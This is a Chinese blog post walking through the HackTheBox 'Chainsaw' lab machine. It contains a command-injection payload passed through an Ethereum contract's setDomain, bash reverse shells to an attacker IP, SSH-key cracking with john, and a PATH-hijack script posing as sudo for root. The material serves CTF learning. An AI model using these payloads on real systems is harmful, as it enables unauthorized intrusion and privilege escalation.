> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lBq75ybvKSH953zocuOCsg)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **159** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/192

靶机难度：高级（5.0/10）

靶机发布日期：2019 年 10 月 8 日

靶机描述：

Chainsaw is a Hard Linux machine with various components in place. The server is running an Ethereum node, which is used to store and retrieve data. This can be modified by an attacker to set malicious data on the latest block and get code execution. The box contains an installation of IPFS (Interplanetary File System), and further enumeration reveals that it contains an encrypted SSH key, which can be cracked to gain lateral movement. This user has execute permissions on a SUID file, which interacts with another node running on localhost. This is exploited in a similar way as earlier to get a root shell.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/YK9e7vHy9IQATwibKVicOpXZibX8VOvBrnF8UXRGvcibFy79c4NzQ5qiaZYAialtVicUHCxUcIPzXM0K4aziaQHEPjTDIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/wibLMEtPxf6EkD9f6Evlem2Z3Kwx8Wsf3ibbJxgNhMufMWibuhVC8fraoR28ibQBwCWXQhOkZMM2ezUHCoHQLjxNYQ/640?wx_fmt=png)

  

一、信息收集

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7JUKaLSIcNhMcLEjibG3HgtOGOFdibKFpibdlkiaXydrepvYGx7nvKEWo5Q/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.142...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7EaNZJDoEmWfDlKqn6rxCw2fOM2gZ5GH0V2cj7aDhGwz1C2aMa0J2dQ/640?wx_fmt=png)

我这里利用 Masscan 快速的扫描出了 21，22，9810 端口，在利用 nmap 详细的扫描了三个端口信息，21 可匿名登录，9810 是 http 服务等...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7P07tJjuDkhGcW0S2RtLfcf1G0Mjx02icXhEuic5vsBnOxyUT2ia8odZ3g/640?wx_fmt=png)

匿名登录发现三个文件... 全都下载到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7seKRf6QwsrsfZBtL4qEXpzrlLDp8yBtcZIBSh2eKapSHrJt2pNZ4HQ/640?wx_fmt=png)

address.txt 包含一个十六进制字符串...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7cLDXBHzEjkiaOT8vnicocjMjjoZJRBNEttugn1dRyvgAtTXrP4UiawKjQ/640?wx_fmt=png)

上面的源代码似乎是 Solidity 版本 0.4.24 进行编写的，该版本表示建立在以太坊技术之上的简单智能合约（就是区域链技术），代码中 getDomain（）返回存储变量的值（在这种情况下，初始值为 “google.com”）和 setDomain（），可以覆盖该值...

WeaponizedPing.json 以 JSON 格式保存智能合约的配置文件，而 address.txt 是地址值，以唯一地标识由计算机程序生成的合约，可以在其中获取或设置存储数据...

基于源代码的功能及其名称 WeaponizedPing，它可能是 ping 服务，也可能不是 ping 服务，用于测试域或 IP 地址是否可以访问，试试...

```
https://solidity.readthedocs.io/en/v0.4.24/contracts.html
https://www.dappuniversity.com/articles/web3-py-intro
```

google 很多文章都讲解了区域链和以太坊等知识... 这两篇文章很好讲解了 web3 技术和以太坊解释...

```
http://remix.ethereum.org/#optimize=false&evmVersion=null&appVersion=0.7.7&version=soljson-v0.5.1+commit.c8a2cb62.js
```

这是以太坊的浏览页面，里面也可以测试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7ryXkuuSbCiczlyyWkHW4Rq4mnoHz1SEckyxW0PNnyyvh8JwZInBXqdQ/640?wx_fmt=png)

```
apt-get install python3-venv
python3 -m venv venv
. venv/bin/activate
pip install web3
```

先安装好 web3...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR781T8v9BNtRvAEf7icOEvnODBjl4pO8Aqcp2vObNGpcykkW3v8aN1Yew/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7XV3MiaFX9hUGWacmYAQnHHMa6olP6jXhgHibx9FzH4AyD8icSyKsfsoOA/640?wx_fmt=png)

```
tcpdump -i tun0 -n
contract.functions.getDomain("10.10.14.51").transact()
```

测试，我设置 tcpdump 为侦听 tun0 任何 ICMP 流量，在另一个终端中，运行了 ping 命令... 成功的，那下一步插入 shell 即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7Xg113yicg7zvmZMicxd3ktz0a4EevEjp472bP0LPggRhglSoL1L2Ccaw/640?wx_fmt=png)

```
contract.functions.setDomain("10.10.14.51; bash -c 'bash -i >& /dev/tcp/10.10.14.51/6666 0>&1'").transact()
```

插入简单的 shell，获得了 administrator 用户的外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7GcLOOzuibwtuKQVwbLZryGAjUwDLU4BGAnHcrNv8dKCPweWU2rWARFQ/640?wx_fmt=png)

发现了 ipfs，.ipfs 管理员主目录中还有一个文件夹...

google 解释到 InterPlentary 文件系统或 IPFS 是一种点对点的分布式文件系统协议，它可以将其他人的计算机用作云存储...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR78EYB5wzhBFSSqxPaIds9eTsKrdJqJlfZxBW58Qexq30wRW2RcERS0w/640?wx_fmt=png)

```
grep -r bobby .
```

我要提权 bobby，查找了有关 bobby 的用户信息...

可看到提到 bobbyaxelrod600@protonmail.chd 的有. ipfs/blocks/OY/CIQG3CRQFZCTN.......... 查看它

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7vtvdv5MM9bMFaw2ibWOvHp3w6u7QiaWuOJeexxbnRYNfDD3sOq39tlvg/640?wx_fmt=png)

```
cat ./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data
```

可看到这是电子邮件信息，前面是对话，后面包含了 base64 值，很熟悉了.... 前面靶机经常遇到 pop3 或者电子邮件破译都是一样的风格...base64

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7CfAe3PczZFKz0KfPuqoicIIoR52858IPPIOatic0ZNJRBktdxc3TKzHg/640?wx_fmt=png)

下面也是... 全都给我复制到本地 base64 转储...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7KRkY1WmeO2T7vXrjcvtqiavwQKPkCjQTChWgLqkI03u5baXW2MKUruA/640?wx_fmt=png)

第一段 base64 转储后是一段邮件对话... 说下面的 ssh 登录等凭证问题... 第二段 base64 是 ssh-key，还包含了密匙...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7ibOiajQ7dwhv4dgR7Ku2Q8mvIicQzpm5F3knhytTeLHoOEgJU885BIeGA/640?wx_fmt=png)

转储成爆破 key 的文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7CNdKIr0J2jiaNzLibHkQocMe17kXT2Qa4aFOArd1FAiaQyyVL5Po1OTrQ/640?wx_fmt=png)

这里很熟悉了，利用 john 开膛手爆破获得了密码... 别忘了 ssh2john 解析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7laeEJtj5picPH14hngfwyvHdeokGVRUvcjhIlnPyx9uVQ5ehcVHbElg/640?wx_fmt=png)

然后利用 key 和密码成功登录 bobby 用户，并获得了 user_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/wibLMEtPxf6EkD9f6Evlem2Z3Kwx8Wsf3ibbJxgNhMufMWibuhVC8fraoR28ibQBwCWXQhOkZMM2ezUHCoHQLjxNYQ/640?wx_fmt=png)

  

方法 1：

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7zjR20ib5duAAnXB19dbBVWNpwEVTrpdGCg8GKFPN1KSHX4M1Z6xl9yQ/640?wx_fmt=png)

在 bobby 用户下还存在两个文件夹，进入后发现，又是和开始 9810 端口 http 服务一样的概念！！！！

传输到本地在说...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7CibrEgA6re6fz9uHsgxuktt9BSPZ51a0KeNyiaxFq3xSr8n2Z4uVX64A/640?wx_fmt=png)

通过 scp 传输到本地.... 可看到还有个隐藏的文件 address.txt 也传出来了...

那么根据前面提 administrator 用户的思路，目前有了 address 值，还需要知道 HTTP 的端口和地址... 前面是靶机 IP+9810...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7I7BRap4SGpZxUfUA9iaO7YksL69Irrh4bGKB643ic2t35fBhFmG3u1sA/640?wx_fmt=png)

这里通过 ss 发现了本地开放了 63991 端口，应该就是它了，或者利用 netstat 都可以查看...

由于是本地开放的服务，我利用了 ssh 端口映射到了本地 kali 上....

访问后，和 http:9810 一样的性质... 也是 400 bad request...

这里前面的性质是一样的，但是后面还是得看 ChainsawClub.sol 参考进行！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7m4moIYxsKursQvdOuzV12pAibiacroBzLP6GkveeOzfDic2swutSDChIw/640?wx_fmt=png)

可以查看到 add 的值，sol 中提示了几个信息... 有：getUsername，getPassword，getApprove，getSupply，getBalance 信息，意思就是这几个都要修改，不然应该是过不去 ChainsawClub 程序的... 开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7MZVLyCk3hv8dlH8qG83O9iaX7OQzBGiaLQ6s7u9ucCtVpynsQb7G494Q/640?wx_fmt=png)

和前面方法一样.... 后面才是重点，继续...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7E7L2VLKmHmhvnc21iaGuOhmYfaMLgmkE3TXt0noqFfc3hbmrQ9nJ42A/640?wx_fmt=png)

这里输出是 get 格式，别和前面的方法搞错了... 前面输出的是 google，这里输出的是 bobby...

这里意思是输出的用户名是 bobby...

下一步我们打算修改该用户名...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7WPDRmMeZvJHb0L89Qd2vI5vyRJ5sPOFUxm36v5hEJj9xh3r1Pc731Q/640?wx_fmt=png)

```
contract.functions.setUsername("用户名").transact()
```

成功修改用户名为 dayu...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7uqUzoUicg0w9D0BEIUfnN11wOClI4LV0kjUppoq47sSueBrxk4baLwQ/640?wx_fmt=png)

经过自己的摸索，可看到修改 passwd 报错了... 一堆数值... 不清楚为啥崩溃了...

然后查看了后面的 sup、balan、app 等，approve 返回的是 false...

右边的框框也是 user 错误... 等报错...

可能是 passwd 没修改成功，或者是 app 的 false 需要修改为 ture... 继续测试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR76bgWoeYuKlYyonuhaeupGG31VXyicFkumdQ28sEKRF5YSAARPSLq7XQ/640?wx_fmt=png)

```
from web3 import Web3, HTTPProvider
import json


contract_address = '0x422F1115Bf13A733191Fc9fbD2D1e9F1475264D7'
contract_data = json.loads(open("ChainsawClub.json", "r").read())
abi = contract_data['abi']


w3 = Web3(HTTPProvider('http://127.0.0.1:63991'))


w3.eth.accounts
w3.eth.accounts[0]
w3.eth.defaultAccount = w3.eth.accounts[0]
contract = w3.eth.contract(abi=abi, address=contract_address)
contract
contract.functions.getUsername().call()
contract.functions.setUsername("dayuxi").transact()
contract.functions.getUsername().call()


import hashlib
md5_hash = hashlib.md5()
plaintext = "dayuxiyou"
md5_hash.update(plaintext.encode('utf-8'))
passw = md5_hash.hexdigest()


contract.functions.setPassword(passw).transact()
Password = contract.functions.getPassword().call()


contract.functions.transfer(1000).transact()
balance = contract.functions.getBalance().call()


contract.functions.getApprove().call()
contract.functions.getSupply().call()
contract.functions.getBalance().call()
```

这里我重新测试了 20 多遍了吧... 无限修改代码...

这是最终的成功的...

修改用户名 -- 修改密码 -- 修改 APP 为 Ture-- 修改 Balan 和 supply 值（颠倒即可）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7CGpAj4gJ0Wa0NNwTFWVKF2eGAgsm0AvC5ryiaZibJiayXCdtKicpwLRQCg/640?wx_fmt=png)

成功修改成功，用创建的用户名密码成功登录程序，并获得了 root 权限...

这里有点奇怪，为什么程序直接运行获得了 root 权限？我又开始了一番研究思考.... 先放着... 后面继续补充

先解决 root_flag 无法读取问题....

经过 google 强大的搜索，发现 Linux 上的 bmap 命令可用于将数据隐藏在内存块的空闲空间中，空闲空间是一块内存中的空白空间，没有被数据完全填充，由于无法正常访问，因此该空间可用于隐藏数据.... 可利用 bmap 进行读取

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7ldVQroVMTmuIDggmRlLmwU7HHJibD28x1iaqNIem4BicibBkH5Yk3ItSvQ/640?wx_fmt=png)

```
bmap --mode slack root.txt
```

成功读取到了隐藏信息...

获得了 root_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/ZrqZaezpWclmao6Vp2LSrkuD0NTO9TiclXmiaWSh0NibqeKL1xJ4qBoJbPODkzJ3g0OvTdUGll3Otz9978tOYib32Q/640?wx_fmt=png)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7wic1112QsL0a3cyHAFmnJSZKDrTtHXa2hswCGmZa15E8RiaokXz9ndpg/640?wx_fmt=png)

可看到调用 sudo 时没有完整路径，但具有 root 权限....

这意味着在创建我们自己的 sudo 文件并修复路径时，将使用 root 特权（即 root shell）来调用它....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7licu9x422ibicTsy7e5k598iaqbiaPDxJJBQwERrwicAwj5NL3y0tv90XWGQ/640?wx_fmt=png)

命令：

```

#!/bin/bash

bash -i &> /dev/tcp/10.10.14.51/7777 0>&1

chmod +x dayu

export PATH=./:$PATH

```

可看到简单的修改下 shell 和配置即可...

成功获得了 root 权限外壳....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNqQROFsxwcwn19F3lzZeR7yLtFPofM4JKMy5iavuXicVgdKfBT8iaRqQkcyHEibGR5LZUFWkX5pta4Cg/640?wx_fmt=png)

后面获得 flag 方法一致....

又是一台知识盲区...

google 很多 Solidity 编写的以太坊，区域链的文章...

通过反复的两次提权都遇到了该方法的原理和编程方法...

开始只是朦胧的懂，通过第二次提 root 反复失败在成功后的经验，有一些熟悉该方法了...

遇到问题 google，google，google 解决不了的，休息一段时间在 google...

总会解决的，当然求人是可遇不可求的，我一般不会问人问题，除非疑难杂症....

加油

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台高级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/YK9e7vHy9IQATwibKVicOpXZibX8VOvBrnF8UXRGvcibFy79c4NzQ5qiaZYAialtVicUHCxUcIPzXM0K4aziaQHEPjTDIw/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)